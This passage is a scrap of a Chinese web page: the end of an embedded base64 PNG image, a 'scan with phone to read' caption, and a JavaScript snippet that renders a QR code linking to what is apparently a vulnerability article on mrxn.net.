tZaxxkh6jJn32tUdF64bohO4YOsDaRO7Sw+2j/E0wEcSU55r2kRsH0khf1Tao1rhOaM0OsB01MEtrWmyTsJoYHAOz2A9iEbyAcBRD9g/WB4+7CvdkO8L+jTgtG35grqKck2q4GxP0Rsba6HMQcRwx5rfY3VF6JullNe5hyEVlw254UQGhhRORtEzrEx99wNxKKF7zmBNZD3nPvhqi8ZiK9cXgUeX8+sz/6snzmj9Y5nCLEH5yBi6B8SnHO/GVYNRB/zwlonrpo1EPWOM75kILnh8v/sBF46kPxEeFsQT4NzEDFgScOZBtg+jsKIrSg5MGrcL0maC6FtxN2B4IE7c2vr3+5fZ33vkgbAt+pfOpC2i+U8fQK7gXj6M/zOKq53DcSTYl7oXEXlqllj3nHGoxwcrw2Rcx/3mKE1EDXQseohcq65iruBXC1cup85gTYQiInCYzzaCvTaZzQQ9Ue1mfcTmTkY62EeA7nssg9s7wdeO2Nt4lzmZ5zyEH2B9auT24d9tRvyYfv6a7fzHwAAAP//svgNlwAAAAZJREFUAwBckaKkhuKwKQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AssTypeSendXML-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 